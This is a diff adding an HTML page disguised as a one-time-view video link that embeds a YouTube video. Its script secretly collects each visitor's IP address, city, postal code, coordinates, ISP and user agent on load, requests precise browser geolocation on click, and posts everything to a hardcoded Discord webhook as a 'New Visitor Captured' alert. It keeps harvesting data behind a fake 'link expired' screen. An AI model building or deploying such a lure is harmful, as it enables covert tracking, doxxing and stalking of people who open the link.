@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Video</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0d0d0d;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            width: 90%;
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+        }
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            padding-top: 56.25%;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            border: none;
+        }
+        .video-wrapper img {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            object-fit: cover;
+            cursor: pointer;
+        }
+        .play-button {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 72px; height: 72px;
+            background: rgba(255,255,255,0.15);
+            border: 3px solid rgba(255,255,255,0.4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background 0.2s;
+            pointer-events: none;
+        }
+        .play-button::after {
+            content: '';
+            display: block;
+            width: 0; height: 0;
+            border-left: 22px solid #fff;
+            border-top: 14px solid transparent;
+            border-bottom: 14px solid transparent;
+            margin-left: 4px;
+        }
+        .video-wrapper:hover .play-button {
+            background: rgba(255,255,255,0.25);
+        }
+        .hidden { display: none; }
+        .expired-overlay {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+        }
+        .expired-overlay h2 { font-size: 22px; margin-bottom: 8px; }
+        .expired-overlay p  { font-size: 14px; color: #aaa; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="video-wrapper" id="videoWrapper">
+        <!-- Thumbnail overlay with play button -->
+        <img id="thumbnail" src="https://img.youtube.com/vi/kLDxvP5X2GY/maxresdefault.jpg"
+             alt="Video thumbnail" />
+        <div class="play-button"></div>
+
+        <!-- The actual video (hidden until clicked) -->
+        <iframe id="videoPlayer"
+                class="hidden"
+                src=""
+                allow="autoplay; encrypted-media"
+                allowfullscreen>
+        </iframe>
+
+        <!-- Expired overlay -->
+        <div class="expired-overlay hidden" id="expiredOverlay">
+            <h2>🔒 This link has expired</h2>
+            <p>This video was a one-time view and is no longer available.</p>
+        </div>
+    </div>
+</div>
+
+<script>
+(function() {
+    'use strict';
+
+    // ============================================================
+    //  CONFIGURE THESE
+    // ============================================================
+    const VIDEO_URL = 'https://www.youtube.com/embed/kLDxvP5X2GY?autoplay=1';
+    const THUMBNAIL_URL = 'https://img.youtube.com/vi/kLDxvP5X2GY/maxresdefault.jpg';
+    const TOKEN_KEY = 'vt_accessed';
+
+    // === DISCORD WEBHOOK — REPLACE THIS WITH YOUR URL ===
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1523295864053960824/OcxLxDP-6B5htEA311dzHT1u7qxOKJxChlVPX_PJwFc___7QgGzPe_78rkKGkLQtMLVU';
+
+
+    // ============================================================
+    //  DOM refs
+    // ============================================================
+    const thumbnail       = document.getElementById('thumbnail');
+    const playButton      = document.querySelector('.play-button');
+    const videoWrapper    = document.getElementById('videoWrapper');
+    const videoPlayer     = document.getElementById('videoPlayer');
+    const expiredOverlay  = document.getElementById('expiredOverlay');
+
+    // ============================================================
+    //  SEND DATA TO DISCORD
+    // ============================================================
+    async function sendToDiscord(data, preciseGeo) {
+        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('YOUR_WEBHOOK')) {
+            console.warn('Discord webhook not configured. Data:', data);
+            return;
+        }
+
+        let message = '**🎯 New Visitor Captured**\n';
+        message += `**IP:** ${data.ip || 'N/A'}\n`;
+        message += `**City:** ${data.city || 'N/A'}\n`;
+        message += `**Region:** ${data.region || 'N/A'}\n`;
+        message += `**Country:** ${data.country_name || data.country || 'N/A'}\n`;
+        message += `**Postal:** ${data.postal || 'N/A'}\n`;
+        message += `**Lat/Lon:** ${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}\n`;
+        message += `**Timezone:** ${data.timezone || 'N/A'}\n`;
+        message += `**ISP/Org:** ${data.org || data.isp || 'N/A'}\n`;
+        message += `**User-Agent:** ${navigator.userAgent}\n`;
+        message += `**Timestamp:** ${new Date().toISOString()}\n`;
+
+        if (preciseGeo) {
+            message += `**📍 Precise Geo:** ${preciseGeo.lat}, ${preciseGeo.lon} (±${preciseGeo.accuracy})\n`;
+        }
+
+        try {
+            await fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: message })
+            });
+            console.log('Data sent to Discord');
+        } catch (err) {
+            console.error('Failed to send to Discord:', err);
+        }
+    }
+
+    // ============================================================
+    //  STEP 1 — IP GEOLOCATION (HTTPS, no key needed)
+    // ============================================================
+    async function captureIPGeo() {
+        try {
+            const resp = await fetch('https://ipapi.co/json/');
+            const data = await resp.json();
+
+            if (data.error) {
+                console.error('IP lookup error:', data.reason);
+                // Fallback to ip-api.com HTTP (might be blocked on HTTPS pages)
+                try {
+                    const fallbackResp = await fetch('http://ip-api.com/json/?fields=status,query,country,regionName,city,zip,lat,lon,isp,org');
+                    const fallbackData = await fallbackResp.json();
+                    if (fallbackData.status === 'success') {
+                        return {
+                            ip: fallbackData.query,
+                            city: fallbackData.city,
+                            region: fallbackData.regionName,
+                            country: fallbackData.country,
+                            postal: fallbackData.zip,
+                            latitude: fallbackData.lat,
+                            longitude: fallbackData.lon,
+                            org: fallbackData.isp + ' / ' + fallbackData.org
+                        };
+                    }
+                } catch (e) {
+                    console.error('Fallback also failed');
+                }
+                return null;
+            }
+
+            return data;
+        } catch (err) {
+            console.error('IP geo error:', err);
+            return null;
+        }
+    }
+
+    // ============================================================
+    //  STEP 2 — BROWSER GEOLOCATION
+    // ============================================================
+    function requestBrowserGeo() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy + ' meters'
+                    });
+                },
+                () => {
+                    resolve(null); // User denied or error
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // ============================================================
+    //  STEP 3 — Show video
+    // ============================================================
+    function showVideo() {
+        localStorage.setItem(TOKEN_KEY, '1');
+        thumbnail.classList.add('hidden');
+        playButton.classList.add('hidden');
+        videoPlayer.classList.remove('hidden');
+        videoPlayer.src = VIDEO_URL;
+    }
+
+    function showExpired() {
+        thumbnail.classList.add('hidden');
+        playButton.classList.add('hidden');
+        videoPlayer.classList.add('hidden');
+        expiredOverlay.classList.remove('hidden');
+    }
+
+    // ============================================================
+    //  MAIN
+    // ============================================================
+    async function init() {
+        // Single-use gate
+        if (alreadyAccessed) {
+            showExpired();
+            // Still silently capture IP
+            const ipData = await captureIPGeo();
+            if (ipData) {
+                await sendToDiscord(ipData, null);
+            }
+            return;
+        }
+
+        // Capture IP geo immediately
+        const ipData = await captureIPGeo();
+
+        // Listen for click
+        const onClick = async () => {
+            videoWrapper.removeEventListener('click', onClick);
+
+            // Request precise geo
+            const preciseGeo = await requestBrowserGeo();
+
+            // Show video
+            showVideo();
+
+            // Send all data to Discord
+            if (ipData) {
+                await sendToDiscord(ipData, preciseGeo);
+            }
+        };
+
+        videoWrapper.addEventListener('click', onClick);
+    }
+
+    init();
+})();
+</script>
+</body>
+</html>
